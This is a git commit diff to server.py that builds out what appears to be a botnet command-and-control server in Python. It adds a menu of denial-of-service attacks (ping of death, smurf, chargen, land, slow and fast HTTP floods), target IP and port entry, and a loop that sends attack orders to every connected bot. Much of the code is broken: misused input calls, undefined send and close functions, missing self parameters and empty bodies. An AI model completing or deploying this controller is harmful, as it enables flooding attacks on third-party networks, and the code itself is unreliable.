8e85228f66acb6dc26f1119e8f5410b7f2ff4260
Young19999 <616987858@qq.com>
2024-12-24 15:38:29 +0800

    second

--- server.py
+++ server.py
@@ -1,4 +1,9 @@
 import threading
+import socket
+import os
+import time
+from io import StringIO
+from typing import List
 
 class netbot:
     def __init__(self, id, is_start, ip_address):
@@ -6,6 +11,7 @@ class netbot:
         self.is_start = is_start
         self.ip_address = ip_address
 
+netbots: List[netbot] = []
 
 class Server:
     def __init__(self):
@@ -49,17 +55,108 @@ class Server:
         else:
             return "\nServer started, waiting for client connections...\n"
             
-    def setup_target_parameters():
+    def setup_target_parameters(self):
+        print("Enter target IP address: ")
+        input(self.target_ip)
+        print("\nEnter target port: ")
+        input(self.target_port)
         
-    def start_attack():
-        
+    def start_attack(self):
+        if(self.attack != "None" and self.target_ip != "None" and self.target_port != 0):
+            for netbot in netbots:
+                if self.attack == "HALT":
+                    message = self.attack
+                else:
+                    message = f"{self.attack}_{self.target_ip}_{self.target_port}"
+
+                send(netbot.id, message.encode(), len(message),0)
+
     def close_connected_sockets():
+        for netbot in netbots:
+            close(netbot.id)
     
     def list_bots():
+        os.system("clear")
+        print(f"\n\nBots connected ({len(netbots)}):\n")
+
+        for bot in netbots:
+            print(f"bot: {bot.ip_address}")
+        
+        print("\nPress any key to exit...")
+
+        input()
         
     def setup_attack_type():
+        attack = ""
+        int_choice = 0
+        while True:
+            os.system("clear")
+            print("\n")
+            print("Attack options: \n")
+            print("1. Ping of death attack")
+            print("2. Smurf attack")
+            print("3. Chargen attack")
+            print("4. Land attack")
+            print("5. Slow HTTP attack")
+            print("6. Fast HTTP attack")
+            print("7. Exit")
+
+            char_choice = input("Enter your choice: ")
+            
+            # 转换输入为整数
+            try:
+                int_choice = int(char_choice)
+            except ValueError:
+                print("Invalid input. Please enter a valid number.")
+                continue
+
+            if int_choice == 1:
+                attack = "POD"
+            elif int_choice == 2:
+                attack = "SMURF"
+            elif int_choice == 3:
+                attack = "CHARGEN"
+            elif int_choice == 4:
+                attack = "LAND"
+            elif int_choice == 5:
+                attack = "SLOWHTTP"
+            elif int_choice == 6:
+                attack = "FASTHTTP"
+            elif int_choice == 7:
+                break
+            else:
+                print("Wrong choice. Enter option again.")
+                continue
+
+            # 如果选择正确，退出循环
+            if int_choice in [1, 2, 3, 4, 5, 6]:
+                break
         
-    def threaded():
+    def threaded(i):
+        buffer = bytearray(1024)
+        try:
+            while True:
+                bytes_received = i.recv_into(buffer) # 接收数据
+                if bytes_received == 0: # 客户端断开连接
+                    # 查找并删除netbot
+                    bot = None
+                    for netbot in netbots:
+                        if netbot.id == i:
+                            bot = netbot
+                            netbots.remove(netbot)
+                            netbot -= 1
+
+                    print(f"\nNetbot ({bot.ip_address}) disconnected.", flush=True)
+
+                    i.close()
+
+                    time.sleep(3)
+                    print("\033[2K\r", end="", flush=True) # 清除当前行
+                    print("\x1b[A", end="", flush=True) # 移动光标到上一行
+                    return
+        except Exception as e:
+            print(f"Error: {e}", flush=True)
+            i.close()
     
     def connection_listener():    
     
